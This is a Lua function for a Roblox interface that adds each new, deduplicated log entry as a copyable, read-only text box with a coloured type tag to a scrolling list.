local function AddLog(type, val)
    if processed[val] then return end
    processed[val] = true
    
    local txt = Instance.new("TextBox") -- TextBox so you can copy the text
    txt.Size = UDim2.new(1, 0, 0, 0)
    txt.BackgroundTransparency = 1
    txt.ClearTextOnFocus = false
    txt.ReadOnly = true
    txt.RichText = true
    txt.Text = string.format("<font color='#FF0000'>[%s]</font> %s", type, tostring(val))
    txt.TextColor3 = Color3.fromRGB(230, 230, 230)
    txt.Font = Enum.Font.Code
    txt.TextSize = 11
    txt.TextWrapped = true
    txt.TextXAlignment = Enum.TextXAlignment.Left
    txt.Parent = Scroll
    
    txt.Size = UDim2.new(1, 0, 0, txt.TextBounds.Y + 5)
    Scroll.CanvasSize = UDim2.new(0, 0, 0, UIList.AbsoluteContentSize.Y)
end

